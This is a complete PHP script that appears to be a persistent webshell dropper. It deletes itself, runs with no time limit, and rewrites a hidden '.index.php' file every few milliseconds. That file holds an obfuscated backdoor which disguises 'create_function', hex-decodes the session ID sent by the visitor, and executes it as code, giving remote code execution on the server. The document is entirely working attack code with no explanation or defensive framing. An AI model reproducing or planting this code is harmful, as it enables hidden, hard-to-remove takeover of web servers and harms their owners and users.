<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.index.php';
$code = '<?php error_reporting(0);define("SS", "session_start");define("SR", "str_replace");function result($arg){return 1 > 0 ? @$arg : 0;}function hex22bin($data) {$len = strlen($data);return pack("H" . $len, $data);}$son = constant("SS");$srn = constant("SR");$son();$ca = "ash123ccash123crash123ceash123caash123ctash123ce_ash123cfash123cuash123cncash123ctioash123cn";$cre = $srn("ash123c","",$ca);$sessionid = session_id();$sessionid = hex22bin($sessionid);$a = $cre("",$sessionid);$a(); ?>';
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}